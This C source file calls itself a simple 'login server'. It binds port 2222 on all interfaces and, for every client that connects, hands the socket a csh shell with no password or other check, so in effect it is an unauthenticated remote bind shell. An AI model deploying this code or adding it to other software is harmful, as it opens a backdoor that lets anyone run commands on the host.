#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <stdio.h>

/* --------------------------------------------------------------- */
/* This  is  a simple "login server" that accepts connections from */
/* remote clients and, for each client, opens a shell on the local */
/* machine.                                                        */
/* --------------------------------------------------------------- */

#define MY_PORT		2222	/* Master socket port number */

int client;

main() 
{
	int	sock, fromlength;
	struct	sockaddr_in	master, from;

	/* Create master socket to await connections */
	sock = socket (AF_INET, SOCK_STREAM, 0);
	if (sock < 0) {
		perror ("Server: cannot open master socket");
		exit (1);
	}

	master.sin_family = AF_INET;
	master.sin_addr.s_addr = INADDR_ANY;
	master.sin_port = htons (MY_PORT);

	/* Bind the port to the master socket */
	if (bind (sock, (struct sockaddr*) &master, sizeof (master))) {
		perror ("Server: cannot bind master socket");
		exit (1);
	}

	listen (sock, 5);

	while (1) {
		/* The main loop */
		client = accept (sock, (struct sockaddr*) & from, & fromlength);
		if (client < 0) {
			perror ("Server: accept failed");
			continue;
		}
                if (fork ())
			close (client);
		else {
			close (sock);
			server ();
			exit (0);
		}
	}
}

server () {

	close (0); close (1); close (2);
	dup2 (client, 0); dup2 (client, 1); dup2 (client, 2);
	system ("csh");
}
